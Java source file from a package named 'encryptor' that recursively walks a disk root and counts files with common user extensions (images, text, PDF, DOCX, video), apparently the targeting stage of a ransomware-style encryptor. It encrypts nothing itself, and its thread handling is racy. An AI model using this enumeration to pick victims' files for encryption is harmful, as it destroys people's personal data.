package encryptor;

import java.io.File;

public class CountFilesToEncrypt extends Thread{
	
	private static long filesCount = 0;
	
	private static int disksChecked = 0;
	
	private static boolean finished = false;
	
	private static String defaultPath;
	
	
	public CountFilesToEncrypt(String defaultPath) {
		CountFilesToEncrypt.defaultPath = defaultPath;
		this.start();
	}
	
	@Override
	public void run() {
		File[] paths;
		// returns pathnames for files and directory
		paths = File.listRoots();
		int disks = paths.length;

		// for each pathname in pathname array
		for (File path : paths) {
			if (path.toString().equals(defaultPath)) {
				new countFiles(path.getAbsolutePath());
			}else {
				upFinishedDisks();
			}
		}
		
		
		System.out.println(disks);
		
		while(disks!=disksChecked) {
			
			System.out.println(disksChecked);
			
		}
		
		
		
		System.out.println("--- CHECKS ---");
		System.out.println(disks);
		System.out.println(disksChecked);
		
		setFinished();
		
		System.out.println("--- FINITO ---");
		System.out.println(getFilesCount());
		
	}
	

	/**
	 * Private thread used to count the amount of files
	 * @author Giachetto Daniele
	 *
	 */
	private class countFiles extends Thread{
		
		private String startDirectory;
		
		/**
		 * Constructor used to get the directory to scan
		 * @param startDirectory
		 */
		public countFiles(String startDirectory) {
			this.startDirectory = startDirectory;
			this.start();
		}
		
		@Override
		public void run() {
			getFiles(startDirectory);
			upFinishedDisks();
		}

		/**
		 * Recursive method used to search for default extension in given directory
		 * @param directoryName directory to be scanned
		 */
		private void getFiles(String directoryName) {
			File directory = new File(directoryName);
			File[] fList = directory.listFiles();
			if (fList != null) {
				for (File file : fList) {
					if (file.isFile()) {
						String extension = "";

						String fileName = file.toString();
						int i = fileName.lastIndexOf('.'); // Restituisce l'ultimo indice in cui viene trovato il carattere "."
						int p = Math.max(fileName.lastIndexOf('/'), fileName.lastIndexOf('\\'));
						// Controlla se il file contiene il punto o se il "." si trova prima dei vari backslash etc
						if (i > p) {
							extension = fileName.substring(i + 1);
						} else {
							
						}
						if (extension.equalsIgnoreCase("PNG") || extension.equalsIgnoreCase("JPG")
								|| extension.equalsIgnoreCase("TXT") || extension.equalsIgnoreCase("JPEG")
								|| extension.equalsIgnoreCase("AVI") || extension.equalsIgnoreCase("JAVA")
								|| extension.equalsIgnoreCase("PDF") || extension.equalsIgnoreCase("DOCX")
								){
							//long fileSize = file.length();
							upFileCount();
						}

					} else if (file.isDirectory()) {
						getFiles(file.getAbsolutePath());
					}
				}
			}
		}	

	}
	
	/**
	 * Getter that returns value of filesCount
	 * @return the value of long variable "filesCount"
	 */
	public static long getFilesCount() {
		return filesCount;
		
	}
	
	/**
	 * Setter that sets finished variable to true
	 * @return the value of "finished" variable
	 */
	public static boolean isFinished() {
		return finished;
	}
	
	/**
	 * Setter used to turn "finished" variable to true
	 */
	private void setFinished() {
		finished = true;
	}
	
	/**
	 * Increment by one the amount of disks checked
	 */
	private synchronized void upFinishedDisks() {
		++disksChecked;
	}
	
	/**
	 * Increment by one the amount of file found with correct extensions
	 */
	private synchronized void upFileCount() {
		++filesCount;
	}
	
	

}
